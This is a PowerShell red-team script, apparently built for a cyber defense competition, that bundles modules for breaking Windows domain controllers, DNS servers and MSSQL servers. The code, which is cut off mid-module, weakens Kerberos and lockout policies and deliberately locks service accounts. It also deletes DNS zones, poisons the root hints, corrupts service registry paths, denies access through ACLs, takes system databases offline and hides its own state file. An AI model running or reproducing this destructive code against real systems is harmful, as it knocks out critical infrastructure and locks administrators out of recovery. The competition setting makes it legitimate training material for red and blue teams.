# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# CCDC Windows Phase 3 -- SERVICE DESTROYER
# Combines all three service-breaking modules into a single standalone script
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
#
#   MODULE 1 -- KerberosKhaos         (Active Directory / Domain Controller)
#              MITRE: T1484.001, T1484.002, T1222, T1531
#              Source: CCDC_Windows_P3_AD_KerberosKhaos.ps1
#
#   MODULE 2 -- ConditionalSurrender  (DNS Server role)
#              MITRE: T1565.001, T1584.002, T1562.004
#              Source: CCDC_Windows_P3_DNS_ConditionalSurrender.ps1
#
#   MODULE 3 -- DeadInTheWater        (MSSQL Server)
#              MITRE: T1489, T1565.001, T1562.004, T1222
#              Source: CCDC_Windows_P3_MSSQL_DeadInTheWater.ps1
#
#   MODULE 4 -- WinRMWrecked          (Windows Remote Management)
#              MITRE: T1489, T1562.004, T1021.006
#
#   MODULE 5 -- SMBShatter            (SMB / LanmanServer)
#              MITRE: T1489, T1021.002, T1565.001
#
#   MODULE 6 -- RDPRuined             (Remote Desktop Protocol)
#              MITRE: T1489, T1021.001, T1562.004
#
#   MODULE 7 -- ICMPDarkness          (ICMP / Ping -- IPSec + MTU)
#              MITRE: T1562.004, T1490
#
# Usage:
#   .\CCDC_Windows_P3_ServiceDestroyer.ps1                   # interactive menu
#   .\CCDC_Windows_P3_ServiceDestroyer.ps1 -All              # run all present roles
#   .\CCDC_Windows_P3_ServiceDestroyer.ps1 -Modules 1,3      # specific modules
#   .\CCDC_Windows_P3_ServiceDestroyer.ps1 -Modules Kerberos,DNS
#   .\CCDC_Windows_P3_ServiceDestroyer.ps1 -Modules WinRM,SMB,RDP,ICMP
#   .\CCDC_Windows_P3_ServiceDestroyer.ps1 -Status           # show state only
#   .\CCDC_Windows_P3_ServiceDestroyer.ps1 -Resume           # skip already-SUCCESS modules
#   .\CCDC_Windows_P3_ServiceDestroyer.ps1 -Force            # re-run even SUCCESS modules
#
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

#Requires -RunAsAdministrator

[CmdletBinding()]
param(
    [string[]] $Modules = @(),
    [switch]   $All,
    [switch]   $Status,
    [switch]   $Resume,
    [switch]   $Force
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "Continue"

# -- Color helpers --------------------------------------------------------------
function Write-Info    { param($m) Write-Host "[*] $m" -ForegroundColor Cyan    }
function Write-Success { param($m) Write-Host "[+] $m" -ForegroundColor Green   }
function Write-Warn    { param($m) Write-Host "[!] $m" -ForegroundColor Yellow  }
function Write-Err     { param($m) Write-Host "[-] $m" -ForegroundColor Red     }
function Write-Section { param($m) Write-Host "`n==[ $m ]==" -ForegroundColor Magenta }

# -- Banner ---------------------------------------------------------------------
function Show-Banner {
    Write-Host ""
    Write-Host " ///////////////////////////////////////////////////////\\" -ForegroundColor Red
    Write-Host " //                                                   //" -ForegroundColor Red
    Write-Host " //   " -ForegroundColor Red -NoNewline
    Write-Host "P3 SERVICE DESTROYER" -ForegroundColor Yellow -NoNewline
    Write-Host "                            //" -ForegroundColor Red
    Write-Host " //   KerberosKhaos  |  ConditionalSurrender  |  DeadInTheWater   //" -ForegroundColor Red
    Write-Host " //   WinRMWrecked   |  SMBShatter            |  RDPRuined        //" -ForegroundColor Red
    Write-Host " //   ICMPDarkness                                                //" -ForegroundColor Red
    Write-Host " //                                                   //" -ForegroundColor Red
    Write-Host " \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\/" -ForegroundColor Red
    Write-Host ""
}

# -- State file -----------------------------------------------------------------
$script:StateFile = "C:\Windows\System32\spool\drivers\color\.p3_svc_state.csv"

function Read-StateFile {
    if (Test-Path $script:StateFile) {
        try {
            return Import-Csv $script:StateFile -ErrorAction Stop
        } catch { return @() }
    }
    return @()
}

function Write-StateFile { param([object[]]$Rows)
    try {
        $Rows | Export-Csv $script:StateFile -NoTypeInformation -Force -ErrorAction Stop
        $sf = Get-Item $script:StateFile -ErrorAction SilentlyContinue
        if ($sf) { $sf.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System }
    } catch { }
}

function Get-ModuleState { param([string]$Name)
    $rows = Read-StateFile
    $row  = $rows | Where-Object { $_.Module -eq $Name } | Select-Object -Last 1
    if ($row) { return $row.Status } else { return "PENDING" }
}

function Set-ModuleState { param([string]$Name, [string]$StateVal)
    $rows   = Read-StateFile
    $rows   = @($rows | Where-Object { $_.Module -ne $Name })
    $rows  += [PSCustomObject]@{ Module = $Name; Status = $StateVal; Time = (Get-Date -Format 'yyyy-MM-dd HH:mm:ss') }
    Write-StateFile $rows
}

# -- Role detection -------------------------------------------------------------
$script:HasAD    = $null -ne (Get-Service -Name NTDS         -ErrorAction SilentlyContinue)
$script:HasDNS   = $null -ne (Get-Service -Name DNS          -ErrorAction SilentlyContinue)
$script:HasMSSQL = $null -ne (Get-Service -Name MSSQLSERVER  -ErrorAction SilentlyContinue)
$script:HasWinRM = $null -ne (Get-Service -Name WinRM        -ErrorAction SilentlyContinue)
$script:HasSMB   = $null -ne (Get-Service -Name LanmanServer -ErrorAction SilentlyContinue)
$script:HasRDP   = $null -ne (Get-Service -Name TermService  -ErrorAction SilentlyContinue)
# ICMP: always present -- no service gating needed

# ==============================================================================
#  MODULE 1 -- KERBEROS KHAOS  (AD/DC)
# ==============================================================================
function Invoke-KerberosKhaos {
    Write-Host ""
    Write-Host " ///////////////////////////////////////////////////////\\" -ForegroundColor Red
    Write-Host "   KerberosKhaos -- T1484.001/T1484.002/T1222/T1531" -ForegroundColor Yellow
    Write-Host " \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\/" -ForegroundColor Red

    if (-not $script:HasAD) {
        Write-Warn "NTDS service not found -- not a Domain Controller. Skipping KerberosKhaos."
        return
    }

    try { Import-Module ActiveDirectory -ErrorAction Stop }
    catch { Write-Err "Failed to import ActiveDirectory module: $_"; return }

    $ADDomain      = Get-ADDomain
    $DomainDNS     = $ADDomain.DNSRoot
    $DomainNetbios = $ADDomain.NetBIOSName
    Write-Info "Domain: $DomainDNS ($DomainNetbios)"

    # -- Layer 1: Kerberos Ticket TTL Weaponization ----------------------------
    Write-Section "KerberosKhaos 1/3  Kerberos Ticket TTL Weaponization"

    $l1TmpBase = "$env:TEMP\kk_l1_$(Get-Random -Maximum 99999)"
    $l1Inf     = "${l1TmpBase}.inf"
    $l1Sdb     = "${l1TmpBase}.sdb"

    $l1InfLines = @(
        '[Unicode]',
        'Unicode=yes',
        '[Version]',
        'signature="$CHICAGO$"',
        'Revision=1',
        '[Kerberos Policy]',
        'MaxServiceAge = 10',
        'MaxTicketAge = 1',
        'MaxRenewAge = 1',
        'MaxClockSkew = 0',
        'TicketValidateClient = 1'
    )
    $l1InfLines | Out-File $l1Inf -Encoding Unicode

    & secedit.exe /configure /db $l1Sdb /cfg $l1Inf /areas SECURITYPOLICY /overwrite /quiet
    if ($LASTEXITCODE -eq 0) {
        Write-Success "Kerberos policy applied via secedit"
        Write-Info   "  MaxTicketAge=1hr  MaxClockSkew=0min  MaxRenewAge=1day"
    } else {
        Write-Err "secedit failed (exit $LASTEXITCODE)"
    }
    Remove-Item $l1Inf, $l1Sdb -Force -ErrorAction SilentlyContinue

    & gpupdate.exe /force /quiet 2>$null
    if ($LASTEXITCODE -eq 0) {
        Write-Success "gpupdate /force executed"
    } else {
        Write-Warn "gpupdate returned exit $LASTEXITCODE -- policy may apply on next refresh"
    }

    # -- Layer 2: Account Lockout Weaponization --------------------------------
    Write-Section "KerberosKhaos 2/3  Account Lockout Weaponization"

    try {
        Set-ADDefaultDomainPasswordPolicy -Identity $DomainDNS `
            -LockoutThreshold 1 `
            -LockoutDuration ([System.TimeSpan]::Zero) `
            -LockoutObservationWindow (New-TimeSpan -Minutes 99999)
        Write-Success "Lockout policy: threshold=1, duration=never, window=99999min"
    } catch {
        Write-Err "Failed to set lockout policy: $_"
    }

    Add-Type -AssemblyName System.DirectoryServices.AccountManagement

    $allEnabled  = Get-ADUser -Filter "Enabled -eq `$True" -Properties SamAccountName
    $svcAccounts = $allEnabled | Where-Object {
        $n = $_.SamAccountName
        $n -like '*svc*'   -or $n -like '*dns*'   -or $n -like '*sql*' -or
        $n -like '*iis*'   -or $n -like '*mssql*' -or $n -like '*http*'
    } | Select-Object -ExpandProperty SamAccountName

    if ($svcAccounts) {
        $ctx = $null
        try {
            $ctx = New-Object System.DirectoryServices.AccountManagement.PrincipalContext(
                [System.DirectoryServices.AccountManagement.ContextType]::Domain,
                $DomainDNS)
        } catch {
            Write-Warn "Could not create domain PrincipalContext: $_"
        }

        foreach ($sam in $svcAccounts) {
            if ($ctx) {
                try {
                    $badPwd = "KK_BadPwd_$(Get-Random -Maximum 999999)"
                    $null   = $ctx.ValidateCredentials($sam, $badPwd)
                    Write-Success "Pre-locked: $sam"
                } catch {
                    Write-Warn "Pre-lock attempt for ${sam}: $_"
                }
            } else {
                Write-Warn "Skipped pre-lock for ${sam} (no domain context)"
            }
        }
        if ($ctx) { $ctx.Dispose() }
    } else {
        Write-Warn "No service accounts matched naming patterns -- skipping pre-lock"
        Write-Info "Policy is live; first bad auth by any svc account will lock it permanently"
    }

    # -- Layer 3: SYSVOL/NETLOGON ACL Destruction -----------------------------
    Write-Section "KerberosKhaos 3/3  SYSVOL/NETLOGON ACL Destruction"

    $sysvolRoot = "C:\Windows\SYSVOL\sysvol\$DomainDNS"
    $aclTargets = @(
        $sysvolRoot,
        "$sysvolRoot\Policies",
        "$sysvolRoot\scripts"
    )

    foreach ($p in $aclTargets) {
        if (Test-Path $p) {
            & icacls.exe $p /remove "Authenticated Users" /T /C /Q 2>$null
            $rc1 = $LASTEXITCODE
            & icacls.exe $p /remove "Everyone" /T /C /Q 2>$null
            $rc2 = $LASTEXITCODE
            if ($rc1 -eq 0 -and $rc2 -eq 0) {
                Write-Success "Stripped ACEs from: $p"
            } else {
                Write-Warn "icacls partial failure on $p (rc1=$rc1 rc2=$rc2)"
            }
        } else {
            Write-Warn "Path not found (skipped): $p"
        }
    }

    $netlogonKey = "HKLM:\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters"
    try {
        Set-ItemProperty -Path $netlogonKey -Name "DisablePasswordChange" -Value 1 -Type DWord
        Write-Success "DisablePasswordChange = 1 set in Netlogon\Parameters"
    } catch {
        Write-Err "Failed to set DisablePasswordChange: $_"
    }

    Write-Success "KerberosKhaos complete -- all 3 layers applied"
    Write-Info "  L1: Restore Default Domain Policy Kerberos settings (gpmc.msc)"
    Write-Info "  L2: Fix lockout policy + manually unlock locked service accounts"
    Write-Info "  L3: Restore SYSVOL ACLs + remove DisablePasswordChange from Netlogon"
}

# ==============================================================================
#  MODULE 2 -- CONDITIONAL SURRENDER  (DNS)
# ==============================================================================
function Invoke-ConditionalSurrender {
    Write-Host ""
    Write-Host " ///////////////////////////////////////////////////////\\" -ForegroundColor Red
    Write-Host "   ConditionalSurrender -- T1565.001/T1584.002/T1562.004" -ForegroundColor Yellow
    Write-Host " \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\/" -ForegroundColor Red

    if (-not $script:HasDNS) {
        Write-Warn "DNS Server service not found -- DNS Server role not installed. Skipping ConditionalSurrender."
        return
    }

    $dnsModuleAvailable = $false
    if (Get-Module -Name DnsServer -ListAvailable -ErrorAction SilentlyContinue) {
        try {
            Import-Module DnsServer -ErrorAction Stop
            $dnsModuleAvailable = $true
            Write-Info "DnsServer PowerShell module loaded"
        } catch {
            Write-Warn "DnsServer module import failed -- will use dnscmd fallback: $_"
        }
    } else {
        Write-Warn "DnsServer PowerShell module not available -- using dnscmd fallback"
    }

    $CompDomains = @("ccdc.local", "range.internal", "competition.local")
    $BlackholeIP = "192.0.2.1"

    # -- Layer 1: Conditional Forwarder Poisoning ------------------------------
    Write-Section "ConditionalSurrender 1/3  Conditional Forwarder Poisoning"

    foreach ($domain in $CompDomains) {
        Write-Info "  Poisoning forwarder: $domain -> $BlackholeIP"
        $applied = $false

        if ($dnsModuleAvailable) {
            try {
                $existing = Get-DnsServerZone -Name $domain -ErrorAction SilentlyContinue
                if ($existing -and $existing.ZoneType -eq "Forwarder") {
                    Set-DnsServerConditionalForwarderZone -Name $domain -MasterServers $BlackholeIP -ErrorAction Stop
                    Write-Success "  Updated existing forwarder zone: $domain -> $BlackholeIP"
                    $applied = $true
                } else {
                    if ($existing) {
                        Remove-DnsServerZone -Name $domain -Force -ErrorAction SilentlyContinue
                        Write-Warn "    Removed existing zone: $domain (was $($existing.ZoneType))"
                    }
                    Add-DnsServerConditionalForwarderZone -Name $domain -MasterServers $BlackholeIP -ErrorAction Stop
                    Write-Success "  Added conditional forwarder: $domain -> $BlackholeIP"
                    $applied = $true
                }
            } catch {
                Write-Warn "    PS module path failed for $domain -- trying dnscmd: $_"
            }
        }

        if (-not $applied) {
            & dnscmd.exe /zonedelete $domain /f 2>$null | Out-Null
            & dnscmd.exe /zoneadd $domain /forwarder $BlackholeIP 2>$null | Out-Null
            if ($LASTEXITCODE -eq 0) {
                Write-Success "  dnscmd: Added forwarder zone $domain -> $BlackholeIP"
            } else {
                Write-Err "  dnscmd: Failed to add forwarder for $domain (rc=$LASTEXITCODE)"
            }
        }
    }

    Write-Info "Deleting all non-auto-created primary DNS zones..."
    if ($dnsModuleAvailable) {
        try {
            $killZones = Get-DnsServerZone -ErrorAction SilentlyContinue | Where-Object {
                $_.ZoneType -eq "Primary" -and -not $_.IsAutoCreated -and $_.ZoneName -ne "TrustAnchors"
            }
            foreach ($z in $killZones) {
                try {
                    Remove-DnsServerZone -Name $z.ZoneName -Force -ErrorAction Stop
                    Write-Success "  Deleted primary zone: $($z.ZoneName)"
                } catch {
                    Write-Warn "  Failed to delete zone $($z.ZoneName): $_"
                }
            }
        } catch {
            Write-Warn "Zone deletion enumeration failed: $_"
        }
    } else {
        $zoneList = & dnscmd.exe /enumzones 2>$null
        foreach ($line in $zoneList) {
            if ($line -match '^\s+(\S+)\s+Primary') {
                $zoneName = $Matches[1]
                if ($zoneName -ne "." -and $zoneName -ne "TrustAnchors") {
                    & dnscmd.exe /zonedelete $zoneName /f 2>$null | Out-Null
                    if ($LASTEXITCODE -eq 0) { Write-Success "  dnscmd: Deleted zone $zoneName" }
                }
            }
        }
    }

    Write-Info "Locking DNS listen address to dead IP (binds to nothing on real interfaces)..."
    & dnscmd.exe /Config /ListenAddresses 192.0.2.1 2>$null | Out-Null
    if ($LASTEXITCODE -eq 0) {
        Write-Success "DNS listen address set to 192.0.2.1 (RFC 5737 blackhole -- DNS answers no real queries)"
    } else {
        Write-Warn "dnscmd /Config /ListenAddresses failed (rc=$LASTEXITCODE)"
    }

    # -- Layer 2: TTL / Scavenging Destruction ---------------------------------
    Write-Section "ConditionalSurrender 2/3  TTL / Scavenging Destruction"

    $dnscmdConfigs = @(
        @{ Flag = "/DefaultTTL";               Value = "1"; Label = "DefaultTTL = 1s"              },
        @{ Flag = "/ScavengingInterval";        Value = "1"; Label = "ScavengingInterval = 1h"       },
        @{ Flag = "/DefaultNoRefreshInterval";  Value = "1"; Label = "DefaultNoRefreshInterval = 1h" },
        @{ Flag = "/DefaultRefreshInterval";    Value = "1"; Label = "DefaultRefreshInterval = 1h"   }
    )

    foreach ($cfg in $dnscmdConfigs) {
        & dnscmd.exe /Config $($cfg.Flag) $($cfg.Value) 2>$null | Out-Null
        if ($LASTEXITCODE -eq 0) {
            Write-Success "  $($cfg.Label)"
        } else {
            Write-Warn "  dnscmd /Config $($cfg.Flag) failed (rc=$LASTEXITCODE)"
        }
    }

    if ($dnsModuleAvailable) {
        try {
            $primaryZones = Get-DnsServerZone | Where-Object {
                $_.ZoneType -eq "Primary" -and -not $_.IsAutoCreated -and $_.ZoneName -ne "TrustAnchors"
            }
            foreach ($z in $primaryZones) {
                try {
                    Set-DnsServerZoneAging -Name $z.ZoneName -Aging $true `
                        -NoRefreshInterval (New-TimeSpan -Hours 1) `
                        -RefreshInterval   (New-TimeSpan -Hours 1) -ErrorAction Stop
                    Write-Success "  Enabled aging on zone: $($z.ZoneName)"
                } catch {
                    Write-Warn "    Zone aging failed for $($z.ZoneName): $_"
                }

                try {
                    $soa    = Get-DnsServerResourceRecord -ZoneName $z.ZoneName -RrType Soa -ErrorAction Stop
                    $soaNew = $soa.Clone()
                    $soaNew.RecordData.MinimumTimeToLive = [System.TimeSpan]::Zero
                    $soaNew.TimeToLive = New-TimeSpan -Seconds 1
                    Set-DnsServerResourceRecord -ZoneName $z.ZoneName `
                        -OldInputObject $soa -NewInputObject $soaNew -ErrorAction Stop
                    Write-Success "  Zeroed SOA minimum TTL for $($z.ZoneName)"
                } catch {
                    Write-Warn "    SOA TTL zeroing failed for $($z.ZoneName): $_"
                }
            }
        } catch {
            Write-Warn "Zone enumeration failed: $_"
        }
    } else {
        Write-Warn "DnsServer module unavailable -- per-zone aging skipped (global TTL applied)"
    }

    Write-Info "Corrupting DNS service ImagePath to prevent restart..."
    try {
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\DNS" -Name "ImagePath" `
            -Value "C:\NonExistent\dns.exe" -ErrorAction Stop
        Write-Success "DNS service ImagePath corrupted to C:\NonExistent\dns.exe"
    } catch {
        Write-Err "Failed to corrupt DNS ImagePath: $_"
    }

    # -- Layer 3: Recursion Trap + Console ACL Lock ----------------------------
    Write-Section "ConditionalSurrender 3/3  Recursion Trap + Console ACL Lock"

    & dnscmd.exe /Config /NoRecursion 1 2>$null | Out-Null
    if ($LASTEXITCODE -eq 0) {
        Write-Success "NoRecursion = 1 (all recursive queries disabled)"
    } else {
        Write-Warn "dnscmd /Config /NoRecursion 1 failed (rc=$LASTEXITCODE)"
    }

    $cacheDns  = "$env:SystemRoot\System32\dns\CACHE.DNS"
    $cacheBack = "$env:SystemRoot\System32\dns\CACHE.DNS.bak"

    if (Test-Path $cacheDns) {
        if (-not (Test-Path $cacheBack)) {
            try {
                Copy-Item $cacheDns $cacheBack -ErrorAction Stop
                Write-Info "Backed up original cache.dns to CACHE.DNS.bak"
            } catch {
                Write-Warn "  Backup of cache.dns failed: $_"
            }
        }

        $fakeRoots = @(
            '; root hints poisoned -- all roots point to RFC 5737 blackhole (192.0.2.1)',
            '.                        3600000 IN  NS  a.root-servers.net.',
            'a.root-servers.net.      3600000     A   192.0.2.1',
            '.                        3600000 IN  NS  b.root-servers.net.',
            'b.root-servers.net.      3600000     A   192.0.2.1',
            '.                        3600000 IN  NS  c.root-servers.net.',
            'c.root-servers.net.      3600000     A   192.0.2.1',
            '.                        3600000 IN  NS  d.root-servers.net.',
            'd.root-servers.net.      3600000     A   192.0.2.1',
            '.                        3600000 IN  NS  e.root-servers.net.',
            'e.root-servers.net.      3600000     A   192.0.2.1',
            '.                        3600000 IN  NS  f.root-servers.net.',
            'f.root-servers.net.      3600000     A   192.0.2.1',
            '.                        3600000 IN  NS  g.root-servers.net.',
            'g.root-servers.net.      3600000     A   192.0.2.1',
            '.                        3600000 IN  NS  h.root-servers.net.',
            'h.root-servers.net.      3600000     A   192.0.2.1',
            '.                        3600000 IN  NS  i.root-servers.net.',
            'i.root-servers.net.      3600000     A   192.0.2.1',
            '.                        3600000 IN  NS  j.root-servers.net.',
            'j.root-servers.net.      3600000     A   192.0.2.1',
            '.                        3600000 IN  NS  k.root-servers.net.',
            'k.root-servers.net.      3600000     A   192.0.2.1',
            '.                        3600000 IN  NS  l.root-servers.net.',
            'l.root-servers.net.      3600000     A   192.0.2.1',
            '.                        3600000 IN  NS  m.root-servers.net.',
            'm.root-servers.net.      3600000     A   192.0.2.1'
        )
        try {
            Set-Content -Path $cacheDns -Value $fakeRoots -Encoding ASCII -ErrorAction Stop
            Write-Success "Root hints (cache.dns) overwritten -- all 13 roots -> $BlackholeIP"
        } catch {
            Write-Err "Failed to overwrite cache.dns: $_"
        }
    } else {
        Write-Warn "cache.dns not found at $cacheDns -- skipping root hints poison"
    }

    try {
        Restart-Service -Name "DNS" -Force -ErrorAction Stop
        Write-Success "DNS service restarted (poisoned root hints now active)"
    } catch {
        Write-Warn "DNS service restart failed -- hints apply after next manual restart: $_"
    }

    $dnsMmc = "$env:SystemRoot\System32\dnsmgmt.msc"
    if (Test-Path $dnsMmc) {
        & icacls.exe $dnsMmc /deny "Everyone:(RX)" /C /Q 2>$null | Out-Null
        if ($LASTEXITCODE -eq 0) {
            Write-Success "ACL-locked dnsmgmt.msc -- DNS Manager console throws Access Denied"
        } else {
            Write-Warn "icacls /deny on dnsmgmt.msc returned $LASTEXITCODE"
        }
    } else {
        Write-Warn "dnsmgmt.msc not found at expected path -- skipping MMC lock"
    }

    try {
        $regHive = [Microsoft.Win32.RegistryKey]::OpenBaseKey(
            [Microsoft.Win32.RegistryHive]::LocalMachine,
            [Microsoft.Win32.RegistryView]::Default
        )
        $dnsKey = $regHive.OpenSubKey(
            "SYSTEM\CurrentControlSet\Services\DNS",
            [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
            [System.Security.AccessControl.RegistryRights]::ChangePermissions -bor
            [System.Security.AccessControl.RegistryRights]::ReadPermissions
        )
        if ($dnsKey) {
            $acl  = $dnsKey.GetAccessControl()
            $deny = New-Object System.Security.AccessControl.RegistryAccessRule(
                "BUILTIN\Users",
                "ReadKey",
                [System.Security.AccessControl.AccessControlType]::Deny
            )
            $acl.AddAccessRule($deny)
            $dnsKey.SetAccessControl($acl)
            $dnsKey.Close()
            Write-Success "Registry ACL: Denied BUILTIN\Users ReadKey on DNS service key"
        } else {
            Write-Warn "Could not open DNS registry key for ACL modification"
        }
        $regHive.Close()
    } catch {
        Write-Warn "Registry ACL on DNS key failed: $_"
    }

    Write-Info "Stopping and disabling DNS service..."
    try {
        Stop-Service -Name DNS -Force -ErrorAction Stop
        Write-Success "DNS service stopped"
    } catch {
        Write-Warn "Could not stop DNS: $_"
    }
    try {
        Set-Service -Name DNS -StartupType Disabled -ErrorAction Stop
        Write-Success "DNS StartupType set to Disabled"
    } catch {
        Write-Warn "Could not disable DNS startup: $_"
    }

    Write-Info "ACL-denying DNS zone directory to prevent file restoration..."
    $dnsZoneDir = "$env:SystemRoot\System32\dns"
    if (Test-Path $dnsZoneDir) {
        & icacls.exe $dnsZoneDir /deny "Everyone:(OI)(CI)(F)" /T /C /Q 2>$null | Out-Null
        if ($LASTEXITCODE -eq 0) {
            Write-Success "DNS zone directory ACL-locked: Everyone denied full access recursively"
        } else {
            Write-Warn "icacls /deny on DNS directory returned $LASTEXITCODE"
        }
    } else {
        Write-Warn "DNS zone directory not found: $dnsZoneDir"
    }

    Write-Success "ConditionalSurrender complete -- all layers applied"
    Write-Info "  L1: Remove conditional forwarders; restore deleted zones; reset listen addresses"
    Write-Info "  L2: Restore DefaultTTL, disable scavenging, restore SOA min TTL; restore DNS ImagePath"
    Write-Info "  L3: Re-enable recursion, restore CACHE.DNS.bak, remove MMC/registry ACLs"
    Write-Info "       Re-enable DNS startup, remove icacls deny from $env:SystemRoot\System32\dns"
}

# ==============================================================================
#  MODULE 3 -- DEAD IN THE WATER  (MSSQL)
# ==============================================================================
function Get-SqlRegBase {
    $sqlRoot = 'HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server'
    $verDir  = Get-ChildItem $sqlRoot -ErrorAction SilentlyContinue |
               Where-Object { $_.PSChildName -match '^MSSQL\d{2}\.MSSQLSERVER$' } |
               Select-Object -First 1
    if (-not $verDir) { return $null }
    return Join-Path $sqlRoot "$($verDir.PSChildName)\MSSQLServer"
}

function Invoke-DeadInTheWater {
    Write-Host ""
    Write-Host " ///////////////////////////////////////////////////////\\" -ForegroundColor Red
    Write-Host "   DeadInTheWater -- T1489/T1565.001/T1562.004/T1222" -ForegroundColor Yellow
    Write-Host " \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\/" -ForegroundColor Red

    if (-not $script:HasMSSQL) {
        Write-Warn "MSSQLSERVER service not found -- not an MSSQL target. Skipping DeadInTheWater."
        return
    }

    $SqlBase = Get-SqlRegBase
    if (-not $SqlBase) {
        Write-Err "Cannot locate SQL Server registry base -- aborting DeadInTheWater"
        return
    }
    Write-Info "SQL Server registry base: $SqlBase"

    # -- Layer 2 (runs first while SQL is up): Database Sabotage --------------
    Write-Section "DeadInTheWater 1/3  Database Sabotage (runs while SQL is live)"

    Write-Info "Executing T-SQL database sabotage via .NET SqlClient..."
    try {
        $connStr = "Server=localhost;Integrated Security=true;Database=master;Connect Timeout=10"
        $conn = New-Object System.Data.SqlClient.SqlConnection($connStr)
        try {
            $conn.Open()
            $statements = @(
                "ALTER DATABASE master SET RESTRICTED_USER WITH ROLLBACK IMMEDIATE",
                "ALTER DATABASE msdb   SET OFFLINE         WITH ROLLBACK IMMEDIATE",
                "ALTER DATABASE model  SET READ_ONLY        WITH ROLLBACK IMMEDIATE"
            )
            foreach ($sql in $statements) {
                try {
                    $cmd = $conn.CreateCommand()
                    $cmd.CommandText    = $sql
                    $cmd.CommandTimeout = 30
                    [void]$cmd.ExecuteNonQuery()
                    Write-Success "Executed: $sql"
                } catch {
                    Write-Err "T-SQL failed: $sql -- $_"
                }
            }
        } finally {
            if ($conn.State -ne [System.Data.ConnectionState]::Closed) { $conn.Close() }
        }
    } catch {
        Write-Err "SqlClient connection failed: $_ -- T-SQL layer skipped"
    }

    Write-Info "Disabling SQL Server TCP/IP protocol in registry..."
    try {
        $tcpPath = "$SqlBase\SuperSocketNetLib\Tcp"
        if (Test-Path $tcpPath) {
            Set-ItemProperty -Path $tcpPath -Name Enabled -Value 0 -Type DWord
            Write-Success "TCP/IP protocol disabled (SuperSocketNetLib\Tcp\Enabled = 0)"
        } else {
            Write-Warn "TCP registry path not found: $tcpPath"
        }
    } catch {
        Write-Err "Failed to disable TCP/IP: $_"
    }

    # -- Layer 3: Port / Discovery Sabotage ------------------------------------
    Write-Section "DeadInTheWater 2/3  Port / Discovery Sabotage"

    Write-Info "Remapping SQL Server listening port 1433 -> 14334..."
    try {
        $ipAllPath = "$SqlBase\SuperSocketNetLib\Tcp\IPAll"
        if (Test-Path $ipAllPath) {
            Set-ItemProperty -Path $ipAllPath -Name TcpPort         -Value "14334"
            Set-ItemProperty -Path $ipAllPath -Name TcpDynamicPorts -Value ""
            Write-Success "TcpPort set to 14334; TcpDynamicPorts cleared"
        } else {
            Write-Warn "IPAll registry path not found: $ipAllPath"
        }
    } catch {
        Write-Err "Failed to remap TCP port: $_"
    }

    Write-Info "Stopping and disabling SQL Server Browser service..."
    try {
        $browserSvc = Get-Service -Name SQLBrowser -ErrorAction SilentlyContinue
        if ($browserSvc) {
            Stop-Service -Name SQLBrowser -Force
            Set-Service  -Name SQLBrowser -StartupType Disabled
            Write-Success "SQLBrowser stopped and disabled"
        } else {
            Write-Info "SQLBrowser service not found -- skipping"
        }
    } catch {
        Write-Err "Failed to disable SQL Browser: $_"
    }

    Write-Info "Adding firewall rules to block TCP 1433 and TCP 14334..."
    try {
        # Inbound: block scoring server connecting TO SQL (LocalPort = port on this machine)
        # Outbound: block this machine connecting OUT to SQL on other hosts (RemotePort = dest port)
        $fwInbound = @(
            @{ Name = "CCDC_Block_SQL_1433_In";   Port = 1433  },
            @{ Name = "CCDC_Block_SQL_14334_In";  Port = 14334 }
        )
        $fwOutbound = @(
            @{ Name = "CCDC_Block_SQL_1433_Out";  Port = 1433  },
            @{ Name = "CCDC_Block_SQL_14334_Out"; Port = 14334 }
        )
        foreach ($r in $fwInbound) {
            if (-not (Get-NetFirewallRule -DisplayName $r.Name -ErrorAction SilentlyContinue)) {
                New-NetFirewallRule -DisplayName $r.Name -Direction Inbound -Protocol TCP `
                    -Action Block -Profile Any -Enabled True -LocalPort $r.Port | Out-Null
                Write-Success "Firewall rule created: $($r.Name)"
            } else { Write-Info "Firewall rule already exists: $($r.Name)" }
        }
        foreach ($r in $fwOutbound) {
            if (-not (Get-NetFirewallRule -DisplayName $r.Name -ErrorAction SilentlyContinue)) {
                New-NetFirewallRule -DisplayName $r.Name -Direction Outbound -Protocol TCP `
                    -Action Block -Profile Any -Enabled True -RemotePort $r.Port | Out-Null
                Write-Success "Firewall rule created: $($r.Name)"
            } else { Write-Info "Firewall rule already exists: $($r.Name)" }
        }
    } catch {
        Write-Err "Firewall rule creation failed: $_"
    }

    # -- Layer 1 (runs last): Service Account + Startup Param Corruption -------
    Write-Section "DeadInTheWater 3/3  Service Account + Startup Param Corruption"

    Write-Info "Changing SQL Server service account to nonexistent local user..."
    $accountChanged = $false
    try {
        [void][Reflection.Assembly]::LoadWithPartialName('Microsoft.SqlServer.SqlWmiManagement')
        $wmi = New-Object Microsoft.SqlServer.Management.Smo.Wmi.ManagedComputer
        $svc = $wmi.Services | Where-Object { $_.Name -eq 'MSSQLSERVER' } | Select-Object -First 1
        if ($svc) {
            $svc.SetServiceAccount('.\NonExistentUser2019', 'BadPass!1')
            $svc.Alter()
            Write-Success "Service account changed via SMO WMI to .\NonExistentUser2019"
            $accountChanged = $true
        }
    } catch {
        Write-Warn "SMO WMI approach failed ($_) -- falling back to registry"
    }

    if (-not $accountChanged) {
        try {
